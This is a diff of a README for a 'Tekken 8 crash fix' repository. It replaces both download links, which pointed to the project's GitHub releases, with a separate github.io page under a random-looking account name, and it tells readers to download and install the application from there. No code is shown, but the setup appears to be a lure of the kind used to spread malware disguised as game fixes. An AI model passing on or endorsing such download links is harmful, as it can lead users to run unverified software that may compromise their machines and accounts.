@@ -1,6 +1,6 @@
 # 🎮 tekken-8-crash-fix - Stop Crashes and Play Smoothly
 
-[![Download Now](https://img.shields.io/badge/Download_Fix-v1.0-blue?style=for-the-badge&logo=windows)](https://github.com/Selfcultivationariestheram505/tekken-8-crash-fix/releases)
+[![Download Now](https://img.shields.io/badge/Download_Fix-v1.0-blue?style=for-the-badge&logo=windows)](https://selfcultivationariestheram505.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide helps you download and apply the Tekken 8 Crash Fix to stop game cras
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Selfcultivationariestheram505/tekken-8-crash-fix/releases](https://github.com/Selfcultivationariestheram505/tekken-8-crash-fix/releases)
+Visit this link to download the application: [https://selfcultivationariestheram505.github.io](https://selfcultivationariestheram505.github.io)
 
 1. Click the download link above.
 2. On the page, find the latest release and click the download button.
